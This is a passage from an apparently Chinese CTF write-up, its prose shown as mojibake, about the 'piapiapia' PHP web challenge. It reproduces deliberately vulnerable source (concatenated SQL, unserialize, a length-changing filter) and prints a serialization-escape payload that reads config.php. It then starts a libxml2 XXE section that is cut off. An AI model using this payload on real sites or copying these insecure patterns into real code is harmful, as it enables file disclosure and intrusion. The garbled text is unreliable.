class=\"title\">login</span><span class=\"params\">($username, $password)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$password = <span class=\"keyword\">parent</span>::filter($password);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t$object = <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_profile</span><span class=\"params\">($username)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t$object = <span class=\"keyword\">parent</span>::select(<span class=\"keyword\">$this</span>-&gt;table, $where);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> $object-&gt;profile;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">\t\t$username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">\t\t$new_profile = <span class=\"keyword\">parent</span>::filter($new_profile);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$where = <span class=\"string\">\"username = '$username'\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">__class__</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">mysql</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> $link = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">connect</span><span class=\"params\">($config)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">$this</span>-&gt;link = mysql_connect(</span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'hostname'</span>],</span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'username'</span>], </span><br><span class=\"line\">\t\t\t$config[<span class=\"string\">'password'</span>]</span><br><span class=\"line\">\t\t);</span><br><span class=\"line\">\t\tmysql_select_db($config[<span class=\"string\">'database'</span>]);</span><br><span class=\"line\">\t\tmysql_query(<span class=\"string\">\"SET sql_mode='strict_all_tables'\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;link;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">select</span><span class=\"params\">($table, $where, $ret = <span class=\"string\">'*'</span>)</span> </span>&#123;</span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"SELECT $ret FROM $table WHERE $where\"</span>;</span><br><span class=\"line\">\t\t$result = mysql_query($sql, <span class=\"keyword\">$this</span>-&gt;link);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_fetch_object($result);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">insert</span><span class=\"params\">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class=\"line\">\t\t$key = implode(<span class=\"string\">','</span>, $key_list);</span><br><span class=\"line\">\t\t$value = <span class=\"string\">'\\''</span> . implode(<span class=\"string\">'\\',\\''</span>, $value_list) . <span class=\"string\">'\\''</span>; </span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"INSERT INTO $table ($key) VALUES ($value)\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_query($sql);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update</span><span class=\"params\">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class=\"line\">\t\t$sql = <span class=\"string\">\"UPDATE $table SET $key = '$value' WHERE $where\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> mysql_query($sql);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">\t\t$escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>);</span><br><span class=\"line\">\t\t$escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; <span class=\"comment\">// \\|\\\\\\\\</span></span><br><span class=\"line\">\t\t$string = preg_replace($escape, <span class=\"string\">'_'</span>, $string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">\t\t$safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__tostring</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"keyword\">__class__</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">$user = <span class=\"keyword\">new</span> user();</span><br><span class=\"line\">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>\n\n<p>config.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'password'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t$config[<span class=\"string\">'database'</span>] = <span class=\"string\">''</span>;</span><br><span class=\"line\">\t$flag = <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>profile.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\trequire_once(&apos;class.php&apos;);</span><br><span class=\"line\">\tif($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class=\"line\">\t\tdie(&apos;Login First&apos;);\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$username = $_SESSION[&apos;username&apos;];</span><br><span class=\"line\">\t$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\">\tif($profile  == null) &#123;</span><br><span class=\"line\">\t\theader(&apos;Location: update.php&apos;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">\t\t$profile = unserialize($profile);</span><br><span class=\"line\">\t\t$phone = $profile[&apos;phone&apos;];</span><br><span class=\"line\">\t\t$email = $profile[&apos;email&apos;];</span><br><span class=\"line\">\t\t$nickname = $profile[&apos;nickname&apos;];</span><br><span class=\"line\">\t\t$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class=\"line\">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class=\"line\">\t\t&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class=\"line\">\t\t&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span><br><span class=\"line\">\t\t&lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span><br><span class=\"line\">\t\t&lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\trequire_once(&apos;class.php&apos;);</span><br><span class=\"line\">\tif($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class=\"line\">\t\tdie(&apos;Login First&apos;);\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif($_POST[&apos;phone&apos;] &amp;&amp; $_POST[&apos;email&apos;] &amp;&amp; $_POST[&apos;nickname&apos;] &amp;&amp; $_FILES[&apos;photo&apos;]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$username = $_SESSION[&apos;username&apos;];</span><br><span class=\"line\">\t\tif(!preg_match(&apos;/^\\d&#123;11&#125;$/&apos;, $_POST[&apos;phone&apos;]))</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid phone&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif(!preg_match(&apos;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&apos;, $_POST[&apos;email&apos;]))</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid email&apos;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tif(preg_match(&apos;/[^a-zA-Z0-9_]/&apos;, $_POST[&apos;nickname&apos;]) || strlen($_POST[&apos;nickname&apos;]) &gt; 10)</span><br><span class=\"line\">\t\t\tdie(&apos;Invalid nickname&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$file = $_FILES[&apos;photo&apos;];</span><br><span class=\"line\">\t\tif($file[&apos;size&apos;] &lt; 5 or $file[&apos;size&apos;] &gt; 1000000)</span><br><span class=\"line\">\t\t\tdie(&apos;Photo size error&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmove_uploaded_file($file[&apos;tmp_name&apos;], &apos;upload/&apos; . md5($file[&apos;name&apos;]));</span><br><span class=\"line\">\t\t$profile[&apos;phone&apos;] = $_POST[&apos;phone&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;email&apos;] = $_POST[&apos;email&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;nickname&apos;] = $_POST[&apos;nickname&apos;];</span><br><span class=\"line\">\t\t$profile[&apos;photo&apos;] = &apos;upload/&apos; . md5($file[&apos;name&apos;]);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$user-&gt;update_profile($username, serialize($profile));</span><br><span class=\"line\">\t\techo &apos;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&apos;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse &#123;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">   &lt;title&gt;UPDATE&lt;/title&gt;</span><br><span class=\"line\">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">\t&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class=\"line\">\t\t&lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class=\"line\">\t\t\t&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;h3&gt;Please Update Your Profile&lt;/h3&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Phone:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Email:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;label&gt;Nickname:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class=\"line\">\t\t\t&lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt;</span><br><span class=\"line\">\t\t\t&lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class=\"line\">\t\t\t&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt;</span><br><span class=\"line\">\t\t&lt;/form&gt;</span><br><span class=\"line\">\t&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>åœ¨ <code>profile.php</code> ä¸­æ‰¾åˆ°æ˜æ˜¾çš„ </p>\n<p><code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code> </p>\n<p>è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè€Œ <code>flag</code> æ”¾åœ¨ <code>config.php</code> æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•è¯»è¿™ä¸ªæ–‡ä»¶ã€‚ä½†æ˜¯ä¸Šé¢è¯»æ–‡ä»¶çš„å‚æ•°é™å®šäº† <code>photo</code> ï¼Œæˆ‘ä»¬åœ¨ <code>update.php</code> ä¸­æ‰¾åˆ°æœ‰å…³ä»£ç </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmove_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">\t\t$profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t$user-&gt;update_profile($username, serialize($profile));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>éœ€è¦ <code>POST</code> å››ä¸ªå‚æ•°ï¼Œå¹¶ä¸”å‘ç° å¯¹ <code>nickname</code> çš„è¿‡æ»¤ä¸å‰ä¸¤ä¸ªä¸åŒï¼Œå¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ã€‚</p>\n<p>ç„¶åå¯¹<code>$profile</code> è¿›è¡Œåºåˆ—åŒ–å¹¶ä¼ å…¥è¿‡æ»¤å‡½æ•°è¿›è¡Œè¿‡æ»¤ã€‚æˆ‘ä»¬æ¥ç€çœ‹è¿‡æ»¤å‡½æ•°</p>\n <figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">\t\t$escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>);</span><br><span class=\"line\">\t\t$escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; <span class=\"comment\">// \\|\\\\\\\\</span></span><br><span class=\"line\">\t\t$string = preg_replace($escape, <span class=\"string\">'_'</span>, $string);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t$safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">\t\t$safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string);</span><br><span class=\"line\">\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>å‘ç°ä» <code>where</code> -&gt; <code>hacker</code> ,é•¿åº¦å¢åŠ ï¼Œè”æƒ³åˆ°ä¹‹å‰çš„ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ã€‚</p>\n<p>æˆ‘ä»¬åœ¨æœ¬åœ°å®éªŒå¾—åˆ°åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²æ˜¯(æ³¨æ„å·²ç»å°†nicknameæ”¹ä¸ºæ•°ç»„)</p>\n<p><code>a:4:{s:5:&quot;phone&quot;;s:11:&quot;12345678912&quot;;s:5:&quot;email&quot;;s:11:&quot;123@123.com&quot;;s:8:&quot;nickname&quot;;a:1:{i:0;s:5:&quot;admin&quot;;}s:5:&quot;photo&quot;;s:39:&quot;upload/5ae0c1c8a5260bc7b6648f6fbd115c35&quot;;}</code></p>\n<p>æˆ‘ä»¬æƒ³è¯»çš„æ–‡ä»¶æ˜¯ <code>config.pgp</code> ,ä¹Ÿå°±æ˜¯è¦æ·»åŠ <code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code> ,é•¿åº¦ä¸º34ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦è¿½åŠ  34 ä¸ª <code>where</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class=\"string\">\";&#125;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">a:4:&#123;s:5:\"</span>phone<span class=\"string\">\";s:11:\"</span><span class=\"number\">12345678901</span><span class=\"string\">\";s:5:\"</span>email<span class=\"string\">\";s:8:\"</span>ss@q.com<span class=\"string\">\";s:8:\"</span>nickname<span class=\"string\">\";a:1:&#123;i:0;s:204:\"</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class=\"string\">\"&#125;;s:5:\"</span>photo<span class=\"string\">\";s:10:\"</span>config.php<span class=\"string\">\";&#125;s:39:\"</span>upload/<span class=\"number\">804</span>f743824c0451b2f60d81b63b6a900<span class=\"string\">\";&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>ä¹‹åæŠ“åŒ…ä¿®æ”¹ nickname ä¸ºæ•°ç»„ï¼Œå°†å€¼æ”¹ä¸ºä¸Šé¢æˆ‘ä»¬æ„é€ çš„å†…å®¹å³å¯ã€‚</p>\n<h2 id=\"real\"><a href=\"#real\" class=\"headerlink\" title=\"real\"></a>real</h2><p>12/19/2019 10:32:05 AM </p>\n<h3 id=\"php-xxe\"><a href=\"#php-xxe\" class=\"headerlink\" title=\"php_xxe\"></a>php_xxe</h3><p>libxml2 2.9.4ä¹‹å‰ç‰ˆæœ¬ï¼Œparser.c/xmlStringLenDecodeEntitieså‡½æ•°å­˜åœ¨XMLå¤–éƒ¨å®ä½“æ¼æ´ï¼Œä¸åœ¨éªŒè¯æ¨¡å¼æ—¶ï¼Œå¯ä½¿ä¸Šä¸‹æ–‡ç‹¬ç«‹çš„æ”»å‡»è€…è¯»å–ä»»æ„æ–‡ä»¶æˆ–é€ æˆæ‹’ç»æœåŠ¡ã€‚</p>\n<p>webç›®å½•./wwwåŒ…å«4ä¸ªæ–‡ä»¶ï¼š</p>\n<pre><code>$ tree .\n.\nâ”œâ”€â”€ dom.php # ç¤ºä¾‹ï¼šä½¿ç”¨DOMDocumentè§£æbody\nâ”œâ”€â”€ index.php\nâ”œâ”€â”€ SimpleXMLElement.php # 